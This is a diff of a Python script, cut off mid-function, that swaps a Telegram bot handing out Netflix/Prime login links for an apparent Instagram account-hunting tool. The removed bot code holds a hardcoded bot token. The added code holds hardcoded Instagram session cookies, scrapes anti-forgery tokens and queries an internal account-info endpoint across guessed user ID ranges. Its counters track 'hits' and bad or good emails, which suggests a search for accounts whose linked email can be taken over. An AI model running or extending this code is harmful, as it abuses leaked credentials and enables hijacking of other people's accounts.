@@ -1,1424 +1,1102 @@
 #!/usr/bin/env python3
-"""
-🎬 Netflix & Prime Premium Referral Bot v5.0
-- Normal emojis (no premium Telegram custom emoji IDs)
-- Persistent user data in SQLite (survives bot restarts)
-- Mandatory channel join before using bot
-- Admin can add/remove channels via admin panel
-- Big animated "N" logo with random letters/numbers
-- 2 Admins, Gift Codes, Dual Stock, Payout Channel
-"""
+# -*- coding: utf-8 -*-
 
-import asyncio
-import json
 import os
+import sys
+import re
+import time
 import random
 import string
-import sqlite3
-import time
-import logging
-from collections import defaultdict
+import json
+import uuid
+import base64
+import hashlib
+import threading
+import requests
+import urllib.parse
+import secrets
+import httpx
+from bs4 import BeautifulSoup
+from threading import Thread, Lock
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from itertools import cycle
+from colorama import Fore, Style, init
 from datetime import datetime
-from typing import Tuple, List, Optional, Dict, Any
+from random import choice, randrange
 
-from telegram import (
-    InlineKeyboardButton,
-    InlineKeyboardMarkup,
-    Update,
-    ReplyKeyboardMarkup,
-    KeyboardButton,
-    ReplyKeyboardRemove,
-)
-from telegram.ext import (
-    Application,
-    CallbackQueryHandler,
-    CommandHandler,
-    ContextTypes,
-    MessageHandler,
-    filters,
-    ConversationHandler,
-)
+init(autoreset=True)
 
-# ============================================================
-# 🛠️ CONFIGURATION - EDIT THESE VALUES
-# ============================================================
-TOKEN = "8876770602:AAELuZ9iG6qzG6V3nT57wd47C6N42PjPk3g"  # ← YOUR BOT TOKEN
-ADMIN_IDS = [5487009658, 8326158961]  # ← YOUR ADMIN IDs
-ADMIN_USERNAMES = ["cuddleneedd", "maxxahere1"]  # ← YOUR USERNAMES
-PAYOUT_CHANNEL = "@your_payout_channel"  # ← YOUR PAYOUT CHANNEL
+R = Fore.RED
+G = Fore.GREEN
+Y = Fore.YELLOW
+C = Fore.CYAN
+W = Fore.WHITE
+M = Fore.MAGENTA
+RESET_COL = Style.RESET_ALL
+B = Style.BRIGHT
 
-POINTS_PER_REFERRAL = 1
-POINTS_NEEDED_FOR_NETFLIX = 3
-POINTS_NEEDED_FOR_PRIME = 4
-DB_FILE = "premium_referral.db"
+hits = 0
+bad_insta = 0
+bad_email = 0
+good_insta = 0
+total = 0
+follower_0_50 = 0
+follower_50_250 = 0
+follower_250_plus = 0
+min_followers = 0
+limit = 0
+taken = 0
+email = ""
+hit_lock = Lock()
 
-# ============================================================
-# 📝 LOGGING
-# ============================================================
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    handlers=[
-        logging.FileHandler('bot.log'),
-        logging.StreamHandler()
-    ]
-)
-logger = logging.getLogger(__name__)
+_about_session_index = 0
+_about_session_lock = Lock()
 
-# ============================================================
-# 🏷️ EMOJI RENDER HELPER - NORMAL EMOJIS ONLY
-# ============================================================
-EMOJIS = {
-    "netflix": "🎬", "prime": "🍿", "premium": "💎", "star": "⭐",
-    "crown": "👑", "fire": "🔥", "gift": "🎁", "ticket": "🎟️",
-    "key": "🔑", "lock": "🔐", "check": "✅", "cross": "❌",
-    "warning": "⚠️", "mail": "📩", "link": "🔗", "chart": "📊",
-    "trophy": "🏆", "medal1": "🥇", "medal2": "🥈", "medal3": "🥉",
-    "gear": "⚙️", "people": "👥", "user": "👤", "money": "💰",
-    "bank": "🏦", "support": "📞", "question": "❓", "back": "🔙",
-    "forward": "➡️", "refresh": "🔄", "add": "➕", "remove": "➖",
-    "admin": "🛡️", "broadcast": "📢", "stock": "📦", "code": "🔢",
-    "time": "⏳", "clock": "🕐", "boom": "💥", "sparkle": "✨",
-    "zap": "⚡", "heart": "💜", "folder": "📁", "clipboard": "📋",
-    "payout": "💰", "channel": "📣", "join": "🔔", "unlock": "🔓",
-    "target": "🎯", "point_up": "⬆️", "point_down": "⬇️",
+ABOUT_SESSION_ID = ""
+ABOUT_CSRF_TOKEN = ""
+ABOUT_DS_USER_ID = ""
+ABOUT_COOKIE_STR = ""
+
+session = requests.Session()
+_session = requests.Session()
+
+ID_RANGES = [
+    (279760001, 900990000, 2013),
+    (900990001, 1629010000, 2014),
+    (1629010001, 2369359761, 2015),
+    (2369359762, 4239516754, 2016),
+    (4239516755, 6345108209, 2017),
+    (6345108210, 10016232395, 2018),
+    (10016232396, 27238602159, 2019),
+    (27238602160, 46464475395, 2020),
+    (46464475395, 50289297647, 2021),
+    (50289297647, 57464707082, 2022),
+    (57464707082, 63313426938, 2023),
+    (63313426938, 70134323896, 2024),
+    (70313426938, 78313496938, 2025)
+]
+
+# Your fresh cookies
+HARDCODED_SESSIONS = [
+{
+    "csrftoken": "tS0085SF9mS3f9B-HsFwWA",
+    "mid": "aicb9QAEAAFvqtc1fk9HpCs9etH8",
+    "ig_did": "DED92EB9-D166-42D6-8AA7-E9FA0650F6F0",
+    "sessionid": "16082790957%3A8BRxX3m6fQDdkN%3A27%3AAYg-kfF3iXVPu_I-jgB8S9U_x10MmZ3ghobS2flUuA",
+    "ds_user_id": "16082790957"
+}
+]
+
+max_CONFIG = {
+    "max_date_filter": False,
+    "max_follower_filter": False,
+    "max_min_followers": 50,          # Minimum followers = 50
+    "max_about_info": True,
+    "max_country": False
 }
 
-def E(name: str) -> str:
-    """Return a normal emoji by name."""
-    return EMOJIS.get(name, "")
+CONFIG = {
+    "insta_graphql": "https://www.instagram.com/api/graphql",
+    "google_url": "https://accounts.google.com",
+    "form_type": "application/x-www-form-urlencoded; charset=UTF-8",
+    "token_file": "tokens.txt",
+    "output_file": "@max_hits.txt",
+    "domain": "@gmail.com",
+    "channel": "https://t.me/stuff_portal",
+    "me": "https://t.me/stuff_portal",
+}
 
-# ============================================================
-# 👑 ADMIN HELPER
-# ============================================================
-def is_admin(user_id: int) -> bool:
-    return user_id in ADMIN_IDS
+def get_country_flag(country_name: str) -> str:
+    if not country_name or country_name in ["-", "Paylasilmadi", "None", ""]:
+        return ""
+    flags = {
+    "Türkiye": "🇹🇷", "Irak": "🇮🇶", "Fransa": "🇫🇷", "Endonezya": "🇮🇩",
+    "Arjantin": "🇦🇷", "Almanya": "🇩🇪", "Amerika Birleşik Devletleri": "🇺🇸",
+    "Birleşik Krallık": "🇬🇧", "İngiltere": "🇬🇧", "İtalya": "🇮🇹",
+    "İspanya": "🇪🇸", "Hollanda": "🇳🇱", "Belçika": "🇧🇪", "İsviçre": "🇨🇭",
+    "Avusturya": "🇦🇹", "İsveç": "🇸🇪", "Norveç": "🇳🇴", "Danimarka": "🇩🇰",
+    "Finlandiya": "🇫🇮", "Polonya": "🇵🇱", "Rusya": "🇷🇺", "Ukrayna": "🇺🇦",
+    "Brezilya": "🇧🇷", "Meksika": "🇲🇽", "Hindistan": "🇮🇳", "Japonya": "🇯🇵",
+    "Güney Kore": "🇰🇷", "Avustralya": "🇦🇺", "Kanada": "🇨🇦", "Mısır": "🇪🇬",
+    "Suudi Arabistan": "🇸🇦", "Birleşik Arap Emirlikleri": "🇦🇪", "Katar": "🇶🇦",
+    "Kuveyt": "🇰🇼", "İran": "🇮🇷", "Yunanistan": "🇬🇷", "Portekiz": "🇵🇹",
+    "Romanya": "🇷🇴", "Bulgaristan": "🇧🇬", "Macaristan": "🇭🇺", "Çekya": "🇨🇿",
+    "Hırvatistan": "🇭🇷", "Sırbistan": "🇷🇸", "Arnavutluk": "🇦🇱", "Kosova": "🇽🇰",
+    "Malezya": "🇲🇾", "Singapur": "🇸🇬", "Tayland": "🇹🇭", "Vietnam": "🇻🇳",
+    "Filipinler": "🇵🇭", "Çin": "🇨🇳", "Hong Kong": "🇭🇰", "Tayvan": "🇹🇼",
+    "Gürcistan": "🇬🇪", "Azerbaycan": "🇦🇿", "Kazakistan": "🇰🇿", "Özbekistan": "🇺🇿",
+    "Pakistan": "🇵🇰", "Bangladeş": "🇧🇩", "Kolombiya": "🇨🇴", "Şili": "🇨🇱",
+    "Peru": "🇵🇪", "Venezuela": "🇻🇪", "Güney Afrika": "🇿🇦", "Nijerya": "🇳🇬",
+    "Kenya": "🇰🇪", "Fas": "🇲🇦", "Tunus": "🇹🇳", "Cezayir": "🇩🇿",
+    "Libya": "🇱🇾", "Sudan": "🇸🇩", "Etiyopya": "🇪🇹", "Gana": "🇬🇭",
+    "Tanzanya": "🇹🇿", "Uganda": "🇺🇬", "Kamerun": "🇨🇲", "Fildişi Sahili": "🇨🇮",
+    "Senegal": "🇸🇳", "Ürdün": "🇯🇴", "Lübnan": "🇱🇧", "Suriye": "🇸🇾",
+    "Yemen": "🇾🇪", "Umman": "🇴🇲", "Bahreyn": "🇧🇭", "İsrail": "🇮🇱",
+    "Filistin": "🇵🇸", "Afganistan": "🇦🇫", "Sri Lanka": "🇱🇰", "Nepal": "🇳🇵",
+    "Myanmar": "🇲🇲", "Kamboçya": "🇰🇭", "Moğolistan": "🇲🇳", "Kırgızistan": "🇰🇬",
+    "Tacikistan": "🇹🇯", "Türkmenistan": "🇹🇲", "Yeni Zelanda": "🇳🇿",
+    "İrlanda": "🇮🇪", "Slovakya": "🇸🇰", "Slovenya": "🇸🇮",
+    "Bosna Hersek": "🇧🇦", "Karadağ": "🇲🇪", "Kuzey Makedonya": "🇲🇰",
+    "Moldova": "🇲🇩", "Belarus": "🇧🇾", "Litvanya": "🇱🇹", "Letonya": "🇱🇻",
+    "Estonya": "🇪🇪", "Lüksemburg": "🇱🇺", "Malta": "🇲🇹", "Kıbrıs": "🇨🇾",
+    "İzlanda": "🇮🇸", "Ermenistan": "🇦🇲", "Ekvador": "🇪🇨", "Bolivya": "🇧🇴",
+    "Paraguay": "🇵🇾", "Uruguay": "🇺🇾", "Küba": "🇨🇺", "Dominik Cumhuriyeti": "🇩🇴",
+    "Haiti": "🇭🇹", "Porto Riko": "🇵🇷", "Guatemala": "🇬🇹", "Honduras": "🇭🇳",
+    "El Salvador": "🇸🇻", "Nikaragua": "🇳🇮", "Kosta Rika": "🇨🇷", "Panama": "🇵🇦",
+    "Trinidad ve Tobago": "🇹🇹", "Jamaika": "🇯🇲",
+}
+    if country_name in flags:
+        return flags[country_name]
+    country_lower = country_name.lower()
+    for key in flags:
+        if key.lower() in country_lower or country_lower in key.lower():
+            return flags[key]
+    return ""
 
-# ============================================================
-# 🗄️ DATABASE
-# ============================================================
-def init_db():
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("""CREATE TABLE IF NOT EXISTS users (
-        user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
-        points INTEGER DEFAULT 0, referrals INTEGER DEFAULT 0,
-        referrer_id INTEGER DEFAULT NULL, joined_date TEXT DEFAULT NULL,
-        netflix_redeemed INTEGER DEFAULT 0, prime_redeemed INTEGER DEFAULT 0,
-        joined_channels TEXT DEFAULT ''
-    )""")
-    c.execute("""CREATE TABLE IF NOT EXISTS withdrawals (
-        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER,
-        type TEXT DEFAULT 'netflix', points_used INTEGER DEFAULT 3,
-        status TEXT DEFAULT 'pending', created_at TEXT DEFAULT NULL,
-        fulfilled_at TEXT DEFAULT NULL
-    )""")
-    c.execute("""CREATE TABLE IF NOT EXISTS netflix_stock (
-        id INTEGER PRIMARY KEY AUTOINCREMENT, login_link TEXT NOT NULL,
-        service TEXT DEFAULT 'netflix', added_by INTEGER,
-        added_at TEXT DEFAULT NULL, status TEXT DEFAULT 'available',
-        assigned_to INTEGER DEFAULT NULL, assigned_at TEXT DEFAULT NULL
-    )""")
-    c.execute("""CREATE TABLE IF NOT EXISTS prime_stock (
-        id INTEGER PRIMARY KEY AUTOINCREMENT, login_link TEXT NOT NULL,
-        service TEXT DEFAULT 'prime', added_by INTEGER,
-        added_at TEXT DEFAULT NULL, status TEXT DEFAULT 'available',
-        assigned_to INTEGER DEFAULT NULL, assigned_at TEXT DEFAULT NULL
-    )""")
-    c.execute("""CREATE TABLE IF NOT EXISTS gift_codes (
-        id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT UNIQUE,
-        points INTEGER DEFAULT 3, created_by INTEGER,
-        created_at TEXT DEFAULT NULL, redeemed_by INTEGER DEFAULT NULL,
-        redeemed_at TEXT DEFAULT NULL, status TEXT DEFAULT 'active'
-    )""")
-    c.execute("""CREATE TABLE IF NOT EXISTS payouts (
-        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER,
-        type TEXT, points_used INTEGER, details TEXT,
-        created_at TEXT DEFAULT NULL
-    )""")
-    c.execute("""CREATE TABLE IF NOT EXISTS required_channels (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        channel_id TEXT UNIQUE,
-        channel_username TEXT,
-        channel_link TEXT,
-        added_by INTEGER,
-        added_at TEXT DEFAULT NULL
-    )""")
-    c.execute("""CREATE TABLE IF NOT EXISTS user_data (
-        user_id INTEGER NOT NULL,
-        key TEXT NOT NULL,
-        value TEXT DEFAULT NULL,
-        PRIMARY KEY (user_id, key)
-    )""")
-    conn.commit()
-    conn.close()
+def r(n):
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))
 
-# ---- Persistent User Data ----
-def set_user_data(user_id: int, key: str, value: Any):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    json_value = json.dumps(value)
-    c.execute("INSERT OR REPLACE INTO user_data (user_id, key, value) VALUES (?, ?, ?)",
-              (user_id, key, json_value))
-    conn.commit()
-    conn.close()
+def gdate(user_id):
+    try:
+        user_id = int(user_id)
+        for lower, upper, year in ID_RANGES:
+            if lower <= user_id <= upper:
+                return year
+        return 2025
+    except Exception:
+        return 2025
 
-def get_user_data(user_id: int, key: str, default: Any = None) -> Any:
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("SELECT value FROM user_data WHERE user_id = ? AND key = ?", (user_id, key))
-    row = c.fetchone()
-    conn.close()
-    if row:
+def get_random_year_range():
+    return random.choice(ID_RANGES)
+
+def _build_cookie_str(s):
+    return (
+        f"csrftoken={s['csrftoken']}; "
+        f"ig_did={s['ig_did']}; "
+        f"mid={s['mid']}; "
+        f"ds_user_id={s['ds_user_id']}; "
+        f"sessionid={s['sessionid']}"
+    )
+
+def _next_about_session():
+    global _about_session_index, ABOUT_SESSION_ID, ABOUT_CSRF_TOKEN, ABOUT_DS_USER_ID, ABOUT_COOKIE_STR
+    with _about_session_lock:
+        s = HARDCODED_SESSIONS[_about_session_index % len(HARDCODED_SESSIONS)]
+        _about_session_index += 1
+    ABOUT_SESSION_ID = s["sessionid"]
+    ABOUT_CSRF_TOKEN = s["csrftoken"]
+    ABOUT_DS_USER_ID = s["ds_user_id"]
+    ABOUT_COOKIE_STR = _build_cookie_str(s)
+    return s
+
+def _random_about_session():
+    s = random.choice(HARDCODED_SESSIONS)
+    cookie_str = _build_cookie_str(s)
+    return s["sessionid"], s["csrftoken"], s["ds_user_id"], cookie_str
+
+ABOUT_WEB_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/128.0.0.0"
+about_tokens = {"fb_dtsg": None, "lsd": None, "rev": "1035271382", "bkv": "61fc9465e13b77eaa110f317859102ba7fb93a0a2bcc08c46473da6713640739"}
+about_token_lock = Lock()
+
+def about_refresh_tokens(cookie_str=None, username="instagram"):
+    global about_tokens
+    global ABOUT_SESSION_ID, ABOUT_COOKIE_STR
+    if not ABOUT_SESSION_ID:
+        return False
+    _cookie = cookie_str or ABOUT_COOKIE_STR
+    try:
+        resp = requests.get(
+            f"https://www.instagram.com/{username}/",
+            headers={
+                "User-Agent": ABOUT_WEB_UA,
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
+                "Accept-Encoding": "gzip, deflate",
+                "Cookie": _cookie,
+                "Referer": "https://www.instagram.com/",
+            }
+        )
+        html = resp.text
+        m  = re.search(r'"f":"([^"]+)"', html)
+        m2 = re.search(r'"LSD"[^}]*"token":"([^"]+)"', html)
+        m3 = re.search(r'"server_revision":(\d+)', html)
+        m4 = re.search(r'__bkv=([a-f0-9]{40,})', html)
+        m5 = re.search(r'"hsi":"([^"]+)"', html)
+        dyn_m = re.search(r'"__dyn":"([^"]+)"', html)
+        csr_m = re.search(r'"__csr":"([^"]+)"', html)
+        with about_token_lock:
+            if m:     about_tokens["fb_dtsg"] = m.group(1)
+            if m2:    about_tokens["lsd"]     = m2.group(1)
+            if m3:    about_tokens["rev"]     = m3.group(1)
+            if m4:    about_tokens["bkv"]     = m4.group(1)
+            if m5:    about_tokens["hsi"]     = m5.group(1)
+            if dyn_m: about_tokens["dyn"]     = dyn_m.group(1)
+            if csr_m: about_tokens["csr"]     = csr_m.group(1)
+        return about_tokens["fb_dtsg"] is not None
+    except Exception:
+        return False
+
+def about_token_refresher():
+    while True:
         try:
-            return json.loads(row[0])
+            if not about_tokens.get("fb_dtsg"):
+                _next_about_session()
+                about_refresh_tokens(ABOUT_COOKIE_STR)
+            else:
+                about_refresh_tokens(ABOUT_COOKIE_STR)
         except:
-            return row[0]
-    return default
+            pass
+        time.sleep(60)
 
-def del_user_data(user_id: int, key: str):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("DELETE FROM user_data WHERE user_id = ? AND key = ?", (user_id, key))
-    conn.commit()
-    conn.close()
-
-def get_user_flags(user_id: int) -> Dict[str, Any]:
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("SELECT key, value FROM user_data WHERE user_id = ?", (user_id,))
-    rows = c.fetchall()
-    conn.close()
-    result = {}
-    for key, value in rows:
-        try:
-            result[key] = json.loads(value)
-        except:
-            result[key] = value
+def get_about_account(user_id, username):
+    if not about_tokens.get("fb_dtsg"):
+        about_refresh_tokens(ABOUT_COOKIE_STR, username)
+    result = _try_get_about(user_id, username)
+    if result.get("join_date") or result.get("country") or result.get("former_usernames"):
+        return result
+    try:
+        _next_about_session()
+        about_refresh_tokens(ABOUT_COOKIE_STR, username)
+        result2 = _try_get_about(user_id, username)
+        return result2
+    except:
+        pass
     return result
 
-# ---- Standard DB Helpers ----
-def get_user(user_id: int) -> Tuple:
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
-    u = c.fetchone()
-    conn.close()
-    return u
-
-def create_user(user_id: int, username: str, first_name: str, referrer_id: int = None):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("INSERT OR IGNORE INTO users (user_id,username,first_name,points,referrals,referrer_id,joined_date,netflix_redeemed,prime_redeemed,joined_channels) VALUES (?,?,?,0,0,?,?,0,0,'')",
-              (user_id, username, first_name, referrer_id, datetime.now().isoformat()))
-    conn.commit()
-    conn.close()
-
-def add_points(user_id: int, points: int):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("UPDATE users SET points = points + ? WHERE user_id = ?", (points, user_id))
-    conn.commit()
-    conn.close()
-
-def deduct_points(user_id: int, points: int):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("UPDATE users SET points = points - ? WHERE user_id = ?", (points, user_id))
-    conn.commit()
-    conn.close()
-
-def increment_referrals(user_id: int):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("UPDATE users SET referrals = referrals + 1 WHERE user_id = ?", (user_id,))
-    conn.commit()
-    conn.close()
-
-def increment_netflix_redeemed(user_id: int):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("UPDATE users SET netflix_redeemed = netflix_redeemed + 1 WHERE user_id = ?", (user_id,))
-    conn.commit()
-    conn.close()
-
-def increment_prime_redeemed(user_id: int):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("UPDATE users SET prime_redeemed = prime_redeemed + 1 WHERE user_id = ?", (user_id,))
-    conn.commit()
-    conn.close()
-
-def update_joined_channels(user_id: int, channel_id: str):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("SELECT joined_channels FROM users WHERE user_id = ?", (user_id,))
-    r = c.fetchone()
-    channels = r[0] if r and r[0] else ''
-    if channel_id not in channels:
-        channels = channels + ',' + channel_id if channels else channel_id
-        c.execute("UPDATE users SET joined_channels = ? WHERE user_id = ?", (channels, user_id))
-    conn.commit()
-    conn.close()
-
-def create_withdrawal(user_id: int, service_type: str = 'netflix', points_used: int = 3):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("INSERT INTO withdrawals (user_id,type,points_used,status,created_at) VALUES (?,?,?,'pending',?)",
-              (user_id, service_type, points_used, datetime.now().isoformat()))
-    wid = c.lastrowid
-    conn.commit()
-    conn.close()
-    return wid
-
-def get_pending_withdrawals(service_type: str = None) -> list:
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    if service_type:
-        c.execute("SELECT * FROM withdrawals WHERE status='pending' AND type=? ORDER BY created_at ASC", (service_type,))
-    else:
-        c.execute("SELECT * FROM withdrawals WHERE status='pending' ORDER BY created_at ASC")
-    w = c.fetchall()
-    conn.close()
-    return w
-
-def fulfill_withdrawal(wid: int):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("UPDATE withdrawals SET status='fulfilled',fulfilled_at=? WHERE id=?", (datetime.now().isoformat(), wid))
-    conn.commit()
-    conn.close()
-
-def add_stock(login_link: str, added_by: int, service: str = 'netflix'):
-    table = 'netflix_stock' if service == 'netflix' else 'prime_stock'
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute(f"INSERT INTO {table} (login_link,service,added_by,added_at,status) VALUES (?,?,?,?,'available')",
-              (login_link, service, added_by, datetime.now().isoformat()))
-    sid = c.lastrowid
-    conn.commit()
-    conn.close()
-    return sid
-
-def get_available_stock(service: str = 'netflix'):
-    table = 'netflix_stock' if service == 'netflix' else 'prime_stock'
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute(f"SELECT * FROM {table} WHERE status='available' ORDER BY added_at ASC LIMIT 1")
-    s = c.fetchone()
-    conn.close()
-    return s
-
-def get_all_stock(service: str = 'netflix'):
-    table = 'netflix_stock' if service == 'netflix' else 'prime_stock'
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute(f"SELECT * FROM {table} ORDER BY added_at DESC")
-    s = c.fetchall()
-    conn.close()
-    return s
-
-def assign_stock(stock_id: int, user_id: int, service: str = 'netflix'):
-    table = 'netflix_stock' if service == 'netflix' else 'prime_stock'
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute(f"UPDATE {table} SET status='assigned',assigned_to=?,assigned_at=? WHERE id=? AND status='available'",
-              (user_id, datetime.now().isoformat(), stock_id))
-    a = c.rowcount
-    conn.commit()
-    conn.close()
-    return a > 0
-
-def get_stock_count(service: str = 'netflix'):
-    table = 'netflix_stock' if service == 'netflix' else 'prime_stock'
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute(f"SELECT COUNT(*) FROM {table} WHERE status='available'")
-    avail = c.fetchone()[0]
-    c.execute(f"SELECT COUNT(*) FROM {table} WHERE status='assigned'")
-    assigned = c.fetchone()[0]
-    c.execute(f"SELECT COUNT(*) FROM {table}")
-    total = c.fetchone()[0]
-    conn.close()
-    return {"available": avail, "assigned": assigned, "total": total}
-
-def generate_gift_code(points: int, created_by: int) -> str:
-    chars = string.ascii_uppercase + string.digits
-    while True:
-        code = ''.join(random.choices(chars, k=12))
-        code = f"{code[:4]}-{code[4:8]}-{code[8:]}"
-        conn = sqlite3.connect(DB_FILE)
-        c = conn.cursor()
-        try:
-            c.execute("INSERT INTO gift_codes (code,points,created_by,created_at,status) VALUES (?,?,?,?,'active')",
-                      (code, points, created_by, datetime.now().isoformat()))
-            conn.commit()
-            conn.close()
-            return code
-        except sqlite3.IntegrityError:
-            conn.close()
-            continue
-
-def redeem_gift_code(code: str, user_id: int) -> Tuple[bool, str]:
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("SELECT * FROM gift_codes WHERE code=? AND status='active'", (code,))
-    gift = c.fetchone()
-    if not gift:
-        conn.close()
-        return False, f"{E('cross')} Invalid or already redeemed code!"
-    points = gift[2]
-    gid = gift[0]
-    c.execute("UPDATE gift_codes SET status='redeemed',redeemed_by=?,redeemed_at=? WHERE id=?",
-              (user_id, datetime.now().isoformat(), gid))
-    c.execute("UPDATE users SET points=points+? WHERE user_id=?", (points, user_id))
-    conn.commit()
-    conn.close()
-    return True, f"{E('check')} **Code Redeemed!** +**{points} points** {E('star')}"
-
-def get_all_gift_codes() -> list:
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("SELECT * FROM gift_codes ORDER BY created_at DESC")
-    g = c.fetchall()
-    conn.close()
-    return g
-
-def log_payout(user_id: int, service_type: str, points_used: int, details: str = ""):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("INSERT INTO payouts (user_id,type,points_used,details,created_at) VALUES (?,?,?,?,?)",
-              (user_id, service_type, points_used, details, datetime.now().isoformat()))
-    p = c.lastrowid
-    conn.commit()
-    conn.close()
-    return p
-
-def get_stats() -> dict:
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("SELECT COUNT(*),SUM(points),SUM(referrals),SUM(netflix_redeemed),SUM(prime_redeemed) FROM users")
-    r = c.fetchone()
-    c.execute("SELECT COUNT(*) FROM withdrawals WHERE status='pending'")
-    pw = c.fetchone()[0] or 0
-    nfs = get_stock_count('netflix')
-    prs = get_stock_count('prime')
-    c.execute("SELECT COUNT(*) FROM gift_codes WHERE status='active'")
-    ac = c.fetchone()[0] or 0
-    c.execute("SELECT COUNT(*) FROM gift_codes WHERE status='redeemed'")
-    rc = c.fetchone()[0] or 0
-    c.execute("SELECT COUNT(*) FROM required_channels")
-    ch = c.fetchone()[0] or 0
-    conn.close()
-    return {"total_users": r[0] or 0, "total_points": r[1] or 0, "total_referrals": r[2] or 0,
-            "total_netflix": r[3] or 0, "total_prime": r[4] or 0, "pending_withdrawals": pw,
-            "stock_netflix_avail": nfs["available"], "stock_netflix_total": nfs["total"],
-            "stock_prime_avail": prs["available"], "stock_prime_total": prs["total"],
-            "active_codes": ac, "redeemed_codes": rc, "channels": ch}
-
-def get_all_users() -> list:
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("SELECT * FROM users ORDER BY points DESC")
-    u = c.fetchall()
-    conn.close()
-    return u
-
-# ---- Channel Management ----
-def add_required_channel(channel_id: str, channel_username: str, channel_link: str, added_by: int):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
+def _try_get_about(user_id, username):
     try:
-        c.execute("INSERT INTO required_channels (channel_id,channel_username,channel_link,added_by,added_at) VALUES (?,?,?,?,?)",
-                  (channel_id, channel_username, channel_link, added_by, datetime.now().isoformat()))
-        conn.commit()
-        conn.close()
-        return True, "Channel added!"
-    except sqlite3.IntegrityError:
-        conn.close()
-        return False, "Channel already exists!"
-
-def remove_required_channel(channel_id: str):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("DELETE FROM required_channels WHERE channel_id = ?", (channel_id,))
-    r = c.rowcount
-    conn.commit()
-    conn.close()
-    return r > 0
-
-def get_required_channels() -> list:
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("SELECT * FROM required_channels")
-    r = c.fetchall()
-    conn.close()
-    return r
-
-# ============================================================
-# ✅ CHANNEL VERIFICATION
-# ============================================================
-async def check_user_channels(bot, user_id: int) -> Tuple[bool, list]:
-    channels = get_required_channels()
-    if not channels:
-        return True, []
-    
-    missing = []
-    for ch in channels:
-        ch_id = ch[1]
-        ch_username = ch[2]
+        _sid, _csrf, _dsid, _cookie = _random_about_session()
+        with about_token_lock:
+            fb_dtsg = about_tokens.get("fb_dtsg")
+            lsd     = about_tokens.get("lsd") or ''.join(random.choices(string.ascii_letters + string.digits, k=10))
+            rev     = about_tokens.get("rev", "1035271382")
+            bkv     = about_tokens.get("bkv", "61fc9465e13b77eaa110f317859102ba7fb93a0a2bcc08c46473da6713640739")
+        if not fb_dtsg:
+            return {"join_date": None, "country": None, "former_usernames": []}
+        hsi     = about_tokens.get("hsi", "7618017801523903853")
+        dyn     = about_tokens.get("dyn", "7xeUjG1mxu1syUbFp41twpUnwgU7SbzEdF8aUco2qwJxS0DU2wx609vCwjE1EE2Cw8G11wBz81s8hwGxu786a3a1YwBgao6C0Mo2")
+        csr     = about_tokens.get("csr", "")
+        jazoest = '2' + str(sum(ord(c) for c in fb_dtsg))
+        spin_t  = str(int(time.time()))
+        post_params = {
+            "__d": "www", "__user": "0", "__a": "1", "__req": "15",
+            "__hs": "20529.HYP:instagram_web_pkg.2.1...0", "dpr": "1",
+            "__ccg": "EXCELLENT", "__rev": rev, "__hsi": hsi,
+            "__dyn": dyn, "__csr": csr, "__comet_req": "7",
+            "__crn": "comet.igweb.PolarisProfilePostsTabRoute",
+            "fb_dtsg": fb_dtsg, "jazoest": jazoest, "lsd": lsd,
+            "__spin_r": rev, "__spin_b": "trunk", "__spin_t": spin_t,
+            "params": json.dumps({"referer_type": "ProfileMore", "target_user_id": str(user_id)}),
+        }
+        url = f"https://www.instagram.com/async/wbloks/fetch/?appid=com.bloks.www.ig.about_this_account&type=app&__bkv={bkv}"
+        resp = requests.post(url, headers={
+            "User-Agent": ABOUT_WEB_UA,
+            "Accept": "*/*",
